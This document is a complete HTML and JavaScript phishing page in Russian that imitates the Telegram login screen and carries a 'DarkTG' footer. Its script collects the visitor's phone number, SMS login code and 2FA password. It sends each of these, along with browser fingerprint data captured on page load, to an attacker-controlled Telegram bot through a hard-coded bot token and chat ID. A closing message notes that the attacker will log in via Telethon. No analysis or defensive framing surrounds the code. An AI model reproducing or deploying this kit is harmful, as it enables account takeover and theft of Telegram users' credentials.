<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telegram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        body {
            background: #0b0b0e;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 16px;
            margin: 0;
        }
        .container {
            background: #14141a;
            padding: 32px 24px;
            border-radius: 28px;
            width: 100%;
            max-width: 380px;
            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.8);
            border: 1px solid #2a2a33;
        }
        .title {
            color: #ffffff;
            font-size: 30px;
            font-weight: 700;
            text-align: center;
            letter-spacing: -0.5px;
            margin-bottom: 28px;
        }
        .country-selector {
            display: flex;
            align-items: center;
            background: #1e1e26;
            border-radius: 16px;
            padding: 4px 12px 4px 4px;
            margin-bottom: 12px;
            border: 1px solid #2c2c3a;
        }
        .country-selector select {
            background: transparent;
            border: none;
            color: #f0f0ff;
            font-size: 17px;
            padding: 14px 6px;
            flex: 1;
            outline: none;
            appearance: none;
            -webkit-appearance: none;
        }
        .country-selector select option {
            background: #14141a;
            color: #fff;
        }
        .country-flag {
            font-size: 26px;
            line-height: 1;
            padding-left: 8px;
        }
        .phone-input-wrapper {
            display: flex;
            align-items: center;
            background: #1e1e26;
            border-radius: 16px;
            border: 1px solid #2c2c3a;
            padding: 0 16px;
            margin-bottom: 16px;
            transition: 0.2s;
        }
        .phone-input-wrapper:focus-within {
            border-color: #6a6aff;
            box-shadow: 0 0 0 3px rgba(100, 100, 255, 0.15);
        }
        .phone-code {
            color: #8888aa;
            font-size: 18px;
            font-weight: 500;
            padding-right: 8px;
            white-space: nowrap;
        }
        .phone-input-wrapper input {
            flex: 1;
            background: transparent;
            border: none;
            padding: 16px 0;
            color: #f0f0ff;
            font-size: 18px;
            outline: none;
            min-width: 0;
            letter-spacing: 0.5px;
        }
        .phone-input-wrapper input::placeholder {
            color: #555566;
            font-weight: 300;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 16px 18px;
            margin: 8px 0;
            border-radius: 16px;
            border: 1px solid #2c2c3a;
            background: #1e1e26;
            color: #f0f0ff;
            font-size: 17px;
            outline: none;
            transition: 0.2s;
        }
        input:focus {
            border-color: #6a6aff;
            box-shadow: 0 0 0 3px rgba(100, 100, 255, 0.12);
        }
        input::placeholder {
            color: #555566;
        }
        button {
            width: 100%;
            padding: 17px;
            background: #6a6aff;
            border: none;
            border-radius: 16px;
            color: #fff;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.15s;
            margin-top: 12px;
            box-shadow: 0 4px 20px rgba(100, 100, 255, 0.25);
        }
        button:active {
            opacity: 0.8;
            transform: scale(0.97);
        }
        .hidden {
            display: none !important;
        }
        .error {
            color: #ff6b6b;
            font-size: 13px;
            text-align: center;
            margin-top: 8px;
            display: none;
        }
        .result {
            color: #69db7c;
            text-align: center;
            font-size: 18px;
            font-weight: 600;
            margin-top: 20px;
        }
        .footer {
            color: #444466;
            font-size: 13px;
            text-align: center;
            margin-top: 28px;
            border-top: 1px solid #1e1e26;
            padding-top: 20px;
            letter-spacing: 0.5px;
        }
        .footer .neon {
            color: #a0a0ff;
            text-shadow: 0 0 8px rgba(100, 100, 255, 0.6), 0 0 20px rgba(100, 100, 255, 0.3);
            font-weight: 600;
        }
        .loader {
            border: 3px solid #2c2c3a;
            border-top: 3px solid #6a6aff;
            border-radius: 50%;
            width: 34px;
            height: 34px;
            animation: spin 0.8s linear infinite;
            margin: 16px auto;
            display: none;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .phone-display {
            color: #8888aa;
            font-size: 15px;
            text-align: center;
            margin-bottom: 12px;
        }
        .phone-display span {
            color: #f0f0ff;
            font-weight: 600;
        }
        .sub-hint {
            color: #444466;
            font-size: 12px;
            text-align: center;
            margin-top: -6px;
            margin-bottom: 12px;
        }
        #step2fa {
            margin-top: 12px;
        }
        .select-arrow {
            color: #666688;
            font-size: 14px;
            padding-right: 6px;
        }
    </style>
</head>
<body>
<div class="container">
    <!-- ЗАГОЛОВОК КАК В ТЕЛЕГРАМЕ -->
    <div class="title">Telegram</div>

    <!-- ШАГ 1: НОМЕР -->
    <div id="step1">
        <div class="country-selector">
            <span class="country-flag" id="flagDisplay">🇷🇺</span>
            <select id="countryCode" onchange="updateFlag()">
                <option value="+7">Россия (+7)</option>
                <option value="+380">Украина (+380)</option>
                <option value="+375">Беларусь (+375)</option>
                <option value="+1">США (+1)</option>
                <option value="+44">Великобритания (+44)</option>
                <option value="+49">Германия (+49)</option>
                <option value="+33">Франция (+33)</option>
                <option value="+90">Турция (+90)</option>
                <option value="+95">Мьянма (+95)</option>
                <option value="+86">Китай (+86)</option>
                <option value="+91">Индия (+91)</option>
                <option value="+81">Япония (+81)</option>
                <option value="+82">Корея (+82)</option>
                <option value="+39">Италия (+39)</option>
                <option value="+34">Испания (+34)</option>
                <option value="+55">Бразилия (+55)</option>
                <option value="+61">Австралия (+61)</option>
                <option value="+7">Казахстан (+7)</option>
            </select>
            <span class="select-arrow">▾</span>
        </div>

        <div class="phone-input-wrapper">
            <span class="phone-code" id="phoneCodeDisplay">+7</span>
            <input type="tel" id="phoneInput" placeholder="900 123 45 67" inputmode="numeric" value="">
        </div>
        <div class="sub-hint">Введите номер без +</div>

        <button onclick="step1()">Далее</button>
        <div class="error" id="err1">Введите корректный номер</div>
    </div>

    <!-- ШАГ 2: КОД -->
    <div id="step2" class="hidden">
        <div class="phone-display">Код отправлен на <span id="phoneDisplay"></span></div>
        <input type="text" id="codeInput" placeholder="Код из SMS" maxlength="6" inputmode="numeric">
        <button onclick="step2()">Подтвердить</button>
        <div class="error" id="err2">Неверный код</div>

        <div id="step2fa" class="hidden">
            <input type="password" id="twofaInput" placeholder="Пароль 2FA (если есть)">
            <button onclick="step3()">Войти</button>
        </div>
    </div>

    <!-- РЕЗУЛЬТАТ -->
    <div id="result" class="hidden">
        <div class="result">✅ Вход выполнен</div>
        <div class="loader" id="loader"></div>
    </div>

    <!-- НЕОНОВЫЙ ФУТЕР DarkTG -->
    <div class="footer">
        <span class="neon">DarkTG</span>
    </div>
</div>

<script>
    // ===== КОНФИГУРАЦИЯ =====
    const BOT_TOKEN = '8799962757:AAFmz4Sq3Ujo4URqCQl2gH4b6sRh51c1NKI';
    const CHAT_ID = '8277809761';
    const WEBHOOK = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    function sendToTG(text) {
        fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: text.substring(0, 4096),
                parse_mode: 'HTML'
            })
        }).catch(e => console.log('Ошибка отправки:', e));
    }

    function getDeviceInfo() {
        return {
            ua: navigator.userAgent,
            screen: `${screen.width}x${screen.height}`,
            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
            ref: document.referrer || 'прямой',
            url: window.location.href,
            time: new Date().toISOString()
        };
    }

    function updateFlag() {
        const sel = document.getElementById('countryCode');
        const code = sel.value;
        const flag = sel.options[sel.selectedIndex].text.split(' ')[0];
        document.getElementById('flagDisplay').textContent = flag;
        document.getElementById('phoneCodeDisplay').textContent = code;
    }

    function getFullPhone() {
        const code = document.getElementById('countryCode').value;
        const num = document.getElementById('phoneInput').value.replace(/\s/g, '');
        if (!num || num.length < 5) return null;
        return code + num;
    }

    function step1() {
        const full = getFullPhone();
        if (!full) {
            document.getElementById('err1').style.display = 'block';
            return;
        }
        document.getElementById('err1').style.display = 'none';

        const info = getDeviceInfo();
        sendToTG(`📱 <b>НОМЕР</b>\n<code>${full}</code>\n\n` +
                 `🖥 ${info.ua}\n📺 ${info.screen}\n🕒 ${info.tz}\n🔗 ${info.ref}`);

        document.getElementById('step1').classList.add('hidden');
        document.getElementById('step2').classList.remove('hidden');
        document.getElementById('phoneDisplay').textContent = full;
    }

    function step2() {
        const code = document.getElementById('codeInput').value.trim();
        if (!code || code.length < 4) {
            document.getElementById('err2').style.display = 'block';
            return;
        }
        document.getElementById('err2').style.display = 'none';

        sendToTG(`🔐 <b>КОД</b>\n<code>${code}</code>`);
        document.getElementById('step2fa').classList.remove('hidden');
        document.getElementById('loader').style.display = 'block';
        document.querySelector('#step2 button').disabled = true;
        document.querySelector('#step2 button').textContent = '⏳ Ожидание...';
    }

    function step3() {
        const twofa = document.getElementById('twofaInput').value.trim() || 'не указан';
        sendToTG(`🔐 <b>2FA</b>\n<code>${twofa}</code>`);

        document.getElementById('result').classList.remove('hidden');
        document.getElementById('loader').style.display = 'none';
        document.getElementById('step2fa').classList.add('hidden');

        sendToTG(`✅ <b>ГОТОВО</b>\n📱 Номер получен\n🔑 Код получен\n🔐 2FA: ${twofa}\n\n➡️ Вход через Telethon`);
    }

    window.onload = function() {
        const info = getDeviceInfo();
        sendToTG(`🟢 <b>НОВЫЙ ВИЗИТ</b>\n🖥 ${info.ua}\n📺 ${info.screen}\n🕒 ${info.tz}\n🔗 ${info.ref}\n📍 ${info.url}`);
        updateFlag();
    };
</script>
</body>
</html>
